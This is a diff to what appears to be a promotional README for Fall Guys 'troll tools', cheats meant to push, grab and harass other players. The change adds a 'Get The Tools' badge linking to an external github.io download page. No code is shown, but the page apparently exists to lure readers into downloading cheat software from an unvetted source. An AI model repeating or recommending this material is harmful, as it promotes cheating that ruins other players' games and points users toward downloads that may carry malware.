@@ -4,7 +4,7 @@
 
 **Fall Guys: Ultimate Knockout** is all about goofy chaos, but some players like to take the madness even further with **troll tools**. These hacks are designed not just to win but to mess with other beans—pushing, grabbing, or trolling them in the most ridiculous ways possible. If you’ve ever wanted to dominate AND laugh while sending opponents flying, this guide covers the best Fall Guys trolling cheats, their features, and how they compare to standard hacks.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Tools-blueviolet)](https://fall-guys-troll-tools.github.io/.github/)
 ---
 
 ## What Are Troll Tools in Fall Guys?
